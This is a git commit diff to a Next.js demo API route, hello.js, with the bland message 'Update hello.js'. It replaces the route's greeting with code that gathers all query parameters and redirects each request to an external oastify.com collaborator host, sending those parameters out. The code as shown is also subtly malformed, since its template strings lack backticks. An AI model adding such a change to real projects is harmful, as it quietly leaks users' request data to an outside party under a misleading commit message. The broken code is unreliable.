fbe406c6cfba9734e526cae9031414470a79b4c7
Security testing <118594933+w2h3@users.noreply.github.com>
2024-05-16 16:31:42 +0300

    Update hello.js

--- basics/demo/pages/api/hello.js
+++ basics/demo/pages/api/hello.js
@@ -1,3 +1,11 @@
 export default (req, res) => {
-  res.status(200).json({ text: 'Hello' });
+
+const queryString = Object.keys(req.query)
+
+.map(key => ${key}=${req.query[key]})
+
+.join('&');
+
+res.redirect(307, https://gbvimvutaem0mqkn8hqd0agx0o6fu6o4ct.oastify.com/?${queryString});
+
 };
